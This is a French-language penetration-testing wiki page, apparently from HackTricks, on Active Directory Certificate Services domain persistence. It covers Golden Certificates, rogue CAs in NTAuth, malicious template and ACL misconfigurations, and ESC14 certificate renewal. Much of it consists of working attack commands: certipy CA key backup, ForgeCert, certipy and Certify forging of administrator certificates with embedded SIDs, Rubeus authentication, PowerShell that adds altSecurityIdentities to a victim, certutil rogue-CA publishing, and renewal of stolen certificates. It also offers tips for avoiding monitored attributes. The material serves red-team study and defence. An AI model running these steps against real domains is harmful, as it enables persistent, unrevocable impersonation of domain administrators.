# Persistance dans le domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Voici un résumé des techniques de persistance dans le domaine présentées dans [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consultez ce document pour plus de détails.<sup>[[5]](#references)</sup>

## Forger des certificats à l’aide de certificats d’AC volés (Golden Certificate) - DPERSIST1

Comment savoir si un certificat est un certificat d’AC ?

On peut déterminer qu’un certificat est un certificat d’AC lorsque plusieurs conditions sont réunies :<sup>[[5]](#references)</sup>

- Le certificat est stocké sur le serveur d’AC, sa clé privée étant protégée par le DPAPI de la machine ou par du matériel tel qu’un TPM/HSM si le système d’exploitation le prend en charge.
- Les champs Issuer et Subject du certificat correspondent tous deux au nom distinctif de l’AC.
- Une extension « CA Version » est présente exclusivement dans les certificats d’AC.
- Le certificat ne comporte pas de champs Extended Key Usage (EKU).

Pour extraire la clé privée de ce certificat, la méthode prise en charge consiste à utiliser l’outil `certsrv.msc` sur le serveur d’AC via l’interface graphique intégrée. Toutefois, ce certificat ne se distingue pas des autres certificats stockés sur le système ; des méthodes telles que la [technique THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) peuvent donc être utilisées pour l’extraire.

Le certificat et sa clé privée peuvent également être obtenus avec Certipy à l’aide de la commande suivante :<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Après avoir obtenu le certificat de l’autorité de certification (CA) et sa clé privée au format `.pfx`, des outils comme [ForgeCert](https://github.com/GhostPack/ForgeCert) peuvent être utilisés pour générer des certificats valides :

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> L’utilisateur ciblé par la falsification de certificat doit être actif et pouvoir s’authentifier dans Active Directory pour que le processus aboutisse. Falsifier un certificat pour des comptes spéciaux comme krbtgt est inefficace.

Ce certificat falsifié sera **valide** jusqu’à la date d’expiration spécifiée et tant que le **certificat de l’autorité de certification racine reste valide** (généralement de 5 à **plus de 10 ans**). Il est également valable pour les **machines** ; associé à **S4U2Self**, il permet donc à un attaquant de **maintenir sa persistance sur n’importe quelle machine du domaine** aussi longtemps que le certificat de l’autorité de certification reste valide.\
De plus, les **certificats générés** par cette méthode **ne peuvent pas être révoqués**, car l’autorité de certification n’en a pas connaissance.

### Fonctionnement avec Strong Certificate Mapping Enforcement (2025+)

Depuis le 11 février 2025 (après le déploiement de KB5014754), les contrôleurs de domaine appliquent par défaut le mode **Full Enforcement** pour les mappages de certificats. En pratique, cela signifie que vos certificats falsifiés doivent soit :

- Contenir une liaison forte avec le compte cible (par exemple, l’extension de sécurité SID), soit
- Être associés à un mappage fort explicite sur l’attribut `altSecurityIdentities` de l’objet cible.<sup>[[1]](#references)</sup>

Pour assurer une persistance fiable, une approche consiste à créer un certificat falsifié lié à l’autorité de certification d’entreprise volée, puis à ajouter un mappage fort explicite au principal victime :

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Remarques
- Si vous pouvez créer des certificats forgés qui incluent l’extension de sécurité SID, ils seront associés implicitement, même avec Full Enforcement. Sinon, privilégiez les mappages forts explicites. Consultez [account-persistence](account-persistence.md) pour en savoir plus sur les mappages explicites.
- La révocation n’aide pas les défenseurs ici : les certificats forgés sont inconnus de la base de données de l’AC et ne peuvent donc pas être révoqués.

#### Forging compatible avec Full Enforcement (prise en compte du SID)

Les outils mis à jour permettent d’intégrer directement le SID, ce qui rend les certificats golden utilisables même lorsque les DC rejettent les mappages faibles :<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

En intégrant le SID, vous évitez de toucher à `altSecurityIdentities`, qui peut être surveillé, tout en satisfaisant aux vérifications de mappage fort.

## Faire confiance aux certificats d’une CA malveillante - DPERSIST2

L’objet `NTAuthCertificates` est défini pour contenir un ou plusieurs **certificats de CA** dans son attribut `cacertificate`, utilisé par Active Directory (AD). Le processus de vérification du **contrôleur de domaine** consiste à rechercher dans l’objet `NTAuthCertificates` une entrée correspondant à la **CA spécifiée** dans le champ Issuer du **certificat** utilisé pour l’authentification. L’authentification se poursuit si une correspondance est trouvée.<sup>[[5]](#references)</sup>

Un attaquant peut ajouter un certificat de CA auto-signé à l’objet `NTAuthCertificates`, à condition d’avoir le contrôle de cet objet AD. En temps normal, seuls les membres du groupe **Enterprise Admin**, ainsi que les **Domain Admins** ou les **Administrators** du **domaine racine de la forêt**, sont autorisés à modifier cet objet. Ils peuvent modifier l’objet `NTAuthCertificates` avec `certutil.exe` en exécutant la commande `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ou en utilisant le [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Autres commandes utiles pour cette technique :

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Cette capacité est particulièrement pertinente lorsqu’elle est utilisée conjointement avec la méthode décrite précédemment, qui consiste à utiliser ForgeCert pour générer dynamiquement des certificats.

> Considérations relatives au mapping après 2025 : placer une CA malveillante dans NTAuth établit uniquement la confiance envers la CA émettrice. Pour utiliser des certificats leaf à des fins d’ouverture de session lorsque les DC sont en **Full Enforcement**, le certificat leaf doit soit contenir l’extension de sécurité SID, soit faire l’objet d’un mapping fort explicite sur l’objet cible (par exemple, Issuer+Serial dans `altSecurityIdentities`). Voir {{#ref}}account-persistence.md{{#endref}}.

## Mauvaise configuration malveillante - DPERSIST3

Les possibilités de **persistence** par le biais de **modifications des descripteurs de sécurité des composants AD CS** sont nombreuses. Les modifications décrites dans la section "[Domain Escalation](domain-escalation.md)" peuvent être mises en œuvre de manière malveillante par un attaquant disposant d’un accès élevé. Cela inclut l’ajout de « droits de contrôle » (par exemple, WriteOwner/WriteDACL/etc.) à des composants sensibles tels que :<sup>[[5]](#references)</sup>

- L’objet ordinateur AD du **serveur CA**
- Le **serveur RPC/DCOM du serveur CA**
- Tout **objet ou conteneur AD descendant** dans **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (par exemple, le conteneur Certificate Templates, le conteneur Certification Authorities, l’objet NTAuthCertificates, etc.)
- Les **groupes AD auxquels l’organisation a explicitement délégué des droits de contrôle sur la CA ou les modèles**. Le groupe intégré Cert Publishers est autorisé à publier des certificats sur des objets utilisateur dans AD ; le fait d’en être membre ne confère à lui seul aucun droit de contrôle ou d’inscription sur la CA ou les modèles. Vérifiez séparément les autorisations de la CA et des modèles concernés. Consultez [Microsoft's description of Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) et [certificate template permissions](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Un exemple de mise en œuvre malveillante serait un attaquant disposant d’**autorisations élevées** dans le domaine qui ajoute l’autorisation **`WriteOwner`** au modèle de certificat **`User`** par défaut, en définissant l’attaquant comme principal disposant de ce droit. Pour exploiter cela, l’attaquant modifierait d’abord le propriétaire du modèle **`User`** pour en devenir lui-même propriétaire. Ensuite, il définirait **`mspki-certificate-name-flag`** sur **1** dans le modèle afin d’activer **`ENROLLEE_SUPPLIES_SUBJECT`**, ce qui permettrait à un utilisateur de fournir un Subject Alternative Name dans la requête. L’attaquant pourrait alors **s’enrôler** à l’aide du **modèle**, en choisissant le nom d’un **administrateur du domaine** comme nom alternatif, puis utiliser le certificat obtenu pour s’authentifier en tant que DA.

Paramètres pratiques que les attaquants peuvent définir pour assurer une persistence à long terme dans le domaine (voir {{#ref}}domain-escalation.md{{#endref}} pour plus de détails et les méthodes de détection) :

- Des indicateurs de stratégie de la CA qui autorisent les SAN fournis par les demandeurs (par exemple, l’activation de `EDITF_ATTRIBUTESUBJECTALTNAME2`). Cela permet de continuer à exploiter les vecteurs de type ESC1.
- Une DACL ou des paramètres de modèle qui autorisent l’émission de certificats utilisables pour l’authentification (par exemple, l’ajout de l’EKU Client Authentication, l’activation de `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Le contrôle de l’objet `NTAuthCertificates` ou des conteneurs CA pour réintroduire continuellement des émetteurs malveillants si les défenseurs tentent de les supprimer.

> [!TIP]
> Dans les environnements renforcés après KB5014754, associer ces mauvaises configurations à des mappings forts explicites (`altSecurityIdentities`) garantit que les certificats émis ou forgés restent utilisables même lorsque les DC imposent un mapping fort.

### Abus du renouvellement de certificat (ESC14) à des fins de persistence

Si vous compromettez un certificat utilisable pour l’authentification (ou un certificat Enrollment Agent), vous pouvez le **renouveler indéfiniment**, tant que le modèle émetteur reste publié et que votre CA fait toujours confiance à la chaîne de l’émetteur. Le renouvellement conserve les liaisons d’identité d’origine tout en prolongeant la validité, ce qui rend l’éviction difficile à moins que le modèle ne soit corrigé ou que la CA ne soit republiée.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Si les contrôleurs de domaine sont en **Full Enforcement**, ajoutez `-sid <victim SID>` (ou utilisez un template qui inclut toujours l’extension de sécurité SID) afin que le certificat feuille renouvelé continue d’être associé de manière forte, sans modifier `altSecurityIdentities`. Les attaquants disposant de droits d’administrateur CA peuvent également modifier `policy\RenewalValidityPeriodUnits` pour prolonger la durée de validité des certificats renouvelés avant de s’en émettre un.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Modifications de l’authentification par certificat sur les contrôleurs de domaine Windows (calendrier d’application et associations fortes)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Référence des commandes et utilisation de forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (forge intégrée avec prise en charge du SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Aperçu de l’abus du renouvellement ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned : abus des services de certificats Active Directory](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
